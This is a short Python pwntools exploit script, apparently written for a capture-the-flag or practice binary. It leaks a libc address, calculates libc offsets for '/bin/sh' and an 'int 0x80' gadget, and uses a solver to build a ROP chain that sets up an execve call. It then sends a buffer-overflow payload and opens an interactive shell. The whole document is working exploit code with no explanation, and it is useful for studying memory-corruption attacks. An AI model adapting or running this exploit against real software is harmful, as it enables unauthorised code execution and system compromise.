#TODO replace pwn tools with the functions of standard library
from pwn import *
from ropchain import solver
from ropchain.gadgets import gadget
import os

context.terminal = 'screen'
os.environ['LD_PRELOAD'] = './libc.so.6'
binary = './a.out'
p = process(binary)
# gdb.attach(p)

libc_stdout = u32(p.recv()[:4])
base = libc_stdout - 0x1b2d60
binsh = base + 0x15b9ab
int80 = base + 0xb07ae
regs = {'eax': 0xb, 'ebx': binsh, 'ecx': 0x0, 'edx': 0x0}
print("libc base: %s" % hex(base))
print("int 0x80: %s" % hex(int80))
print("binsh: %s" % hex(binsh))

gadgets = gadget.parseGadget(open('./gadgetList.txt').readlines())
rop = solver.solve(regs, gadgets, base)
rop.dump()

payload = ''
payload += 'A' * 0x100 + 'BBBB'
payload += rop.payload()
payload += p32(int80)

p.send(payload)

p.interactive()
